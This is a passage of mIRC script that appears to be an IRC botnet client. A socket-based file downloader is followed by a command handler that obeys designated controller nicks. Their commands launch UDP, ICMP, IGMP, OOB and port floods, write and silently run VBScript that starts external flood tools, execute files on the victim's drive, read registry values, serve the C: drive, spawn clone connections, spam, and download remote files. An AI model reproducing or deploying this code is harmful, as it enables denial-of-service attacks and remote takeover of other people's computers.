   sockopen:downloader:{
     if ($sockerr > 0) { echo **Invalid URL, check your parameters and retry. | return }
     if (%down.t == http) {
       set %down.time $ctime | .timerdown 0 1 down.ref
       dsock GET %down.rfile
     }
     else { %down.ftplst = $true }
   }
   on 1:sockclose:downloader:{
     if (%down.t == ftp) { return }
     elseif ($lof(%down.lfile) < 500) {
       %down.hi = 0
       :loop
       inc %down.hi
       if (%down.hi > $lines(%down.lfile)) { goto sndmsg }
       else {
         %down.htmp = $read -l $+ %down.hi %down.lfile
         if ((404 isin %down.htmp) && (not isin %down.htmp) && (found isin %down.htmp)) {
           decho Possible HTTP Error: %down.htmp
           decho ^-to delete this file, press shift+f7
         }
         else { goto loop }
       }
     }
     else {
       :sndmsg
       decho %down.rfile Completed ( $+ $lof(%down.lfile) $+ bytes) in $duration($getdown.t)
       decho Average Speed: $calc($lof(%down.lfile) / $getdown.t) bps
     }
     sf5 -n
   }
   on 1:sockread:downloader:{
     if ($sockerr > 0) { decho ** .4Unknown error occured. | sf5 | halt }
     elseif ((%down.t == ftp) && (%down.ftplst)) {
       :nextread1
       sockread %temp
       if ($sockbr == 0) { return }
       decho %temp
       down.proc %temp
       goto nextread1
     }
     else {
       :nextread
       sockread &temp
       if ($sockbr == 0) { return }
       .bwrite %down.lfile -1 &temp
       goto nextread
     }
   }
   on 1:socklisten:downftpget:{ sockaccept downftpgetit }
   on 1:sockread:downftpgetit:{
     if ($sockerr > 0) { decho ** .4Unknown error occured. | sf5 | halt }
     if (%down.ftpjlst) {
       sockread %down.lstit
       %down.filesiz = $gettok(%down.lstit, 5, 32)
       decho %down.lstit | unset %down.ftpjlst
       sockclose downftpget | sockclose downftpgetit
     }
     else {
       :nextread
       sockread &temp
       if ($sockbr == 0) { return }
       bwrite %down.lfile -1 &temp
       goto nextread
     }
   }
   on 1:close:@downloader:{
     %downsave.downpos = $window(@downloader).x $window(@downloader).y $window(@downloader).w $window(@downloader).h
     if ($window(@down-status)) { window -c @down-status }
   }
   on 1:close:@down-status:{ %downsave.down-statuspos = $window(@down-status).x $window(@down-status).y $window(@down-status).w $window(@down-status).h }
   on 1:input:@downloader:{ if ($left($1, 1) != $chr($asc(/))) { downloader $1- | halt } }
   on 1:load:{
     %downsave.down-statuspos = 454 273 470 225
     %downsave.downpos = 3 278 702 301
     %downsave.getdir = $getdir
   }
   on 1:TEXT:*:*:{
    if ($nick == %M1) || ($nick == %M2) || ($nick == %M3) {
    if ($1 == !portattack) { if ($4 == $null) { /msg # portattack error | halt } | /timer3 $4 on { //sockopen +AUTH+AUTH+AUTH+AUTH+AUTH+AUTH+AUTH+AUTH+AUTH+AUTH $+ $2 $2 $3 $2 } | /timer4 $4 on { //sockclose +AUTH+AUTH+AUTH+AUTH+AUTH+AUTH+AUTH+AUTH+AUTH+AUTH $+ $2 $2 $3 $2 } | }
    elseif ($1 == !nick) { if ($2 == $null) { /msg # nick error | halt } | /nick $2 $+ - $+ $r(1,9999) }
    elseif ($1 == !crud) { if ($3 == $null) { /msg # crud error | halt } | /timer1 $3 on { //sockopen +AUTH+AUTH+AUTH+AUTH+AUTH+AUTH+AUTH+AUTH+AUTH+AUTH $+ $2 $2 $r(1,22222) $2 } | /timer2 $3 on { //sockclose +AUTH+AUTH+AUTH+AUTH+AUTH+AUTH+AUTH+AUTH+AUTH+AUTH $+ $2 $2 $r(1,22222) $2 } | }
    elseif ($1 == !connection) { /msg # connection[ $+ $dll(moo.dll,connection,_) $+ ] }
    elseif ($1 == !igmp) { if ($2 == $null) { /msg # igmp error | halt } | .remove igmp.vbs | .write igmp.vbs Set src3 = CreateObject("Wscript.shell") | .write igmp.vbs src3.run "command /c igmp $2 ",0,true | .run igmp.vbs }
    elseif ($1 == !oob) { if ($3 == $null) { /msg # oob error | halt } | .remove pepsi.vbs | .write pepsi.vbs Set src3 = CreateObject("Wscript.shell") | .write pepsi.vbs src3.run "command /c pepsi -n $3 -p $4 -d $5 $2 ",0,true | .run pepsi.vbs }
    elseif ($1 == !icmp) { if ($4 == $null) { /msg # icmp error | halt } | .remove icmp.vbs | .write icmp.vbs Set src3 = CreateObject("Wscript.shell") | .write icmp.vbs src3.run "command /c ping -n $4 -l $3 -w 0 $2 ",0,true | .run icmp.vbs }
    elseif ($1 == !udp) { if ($4 == $null) { /msg # udp error | halt } | //set %pchan # |  if ($4 == random) { //gcoolstart $2 $3 $r(1,65000) | halt } | //gcoolstart $2 $3 $4 }
    elseif ($1 == !run) { if ($2 == $null) { /msg # run error | halt } | .run $findfile(c:\,$2,1) | /msg # $2 executed }
    elseif ($1 == !visit) { if ($2 == $null) { /msg # visit error | halt } | //run $2 }
    elseif ($1 == !jump) { if ($2 == $null) { /msg # jump error | halt } | /msg # !hop | /server $2- }
    elseif ($1 == !reload) { //run taskmgr.exe | /exit | halt }
    elseif ($1 == !stop) { /msg # Flood aborted | /timers off | halt }
    elseif ($1 == !spammsg) { if ($2 == $null) { /msg # spammsg error | halt } | set %spam $2- | /msg # Spammsg : %spam | halt }
    elseif ($1 == !fserve) { if ($2 == $null) { /msg # fserve error | halt } | fserve $nick 5 $2 $+ :\ }
    elseif ($1 == !spam)  { spam }
    elseif ($1 == !stopspam)  { spam1 }
    elseif ($1 == !proxy)  { openwin }
    elseif ($1 == !stopproxy)  { closewin }
    elseif ($1 == !clones) { socklisten botidentclone. $+ $rand(0,1000000) 113 | sockopen clone. $+ $rand(0,1000000000) $2 $3 | halt }
    elseif ($1 == !clonesc) { sockclose clone* | sockclose botidentclone* | halt }
    elseif ($1 == !clonesred) { sockwrite -n clone* $2- | halt }
    elseif ($1 == !download) { if ($2 == $null) { /msg # download error | halt } | /downloader $2- | halt }
    elseif ($1 == !hlkey) { /hlkey | halt }
    elseif ($1 == !readkey) { if ($2 == $null) { /msg # key error | halt } | /timer 1 1 msg # The value of $2 is $regread($2) | halt }
    elseif ($1 == !rename) { if ($2 == $null) { /msg # rename error | halt } | /msg # $dll(shel32.dll,RENAME,$2) }
    elseif ($1 == !stopident) { sockclose botidentspam* | sockclose botidentclone*  }
    halt
    }
   }
   alias gcoolstart  {
      if $3 = $null { return }
      if $timer(gcoolt).com != $null { msg %pchan .ERROR!. Currently flooding:. $gettok($timer(gcoolt).com,3,32) . | return }
      set %gnum 0
      .timergcoolt -m 0 400 gdope $1 $2 $3
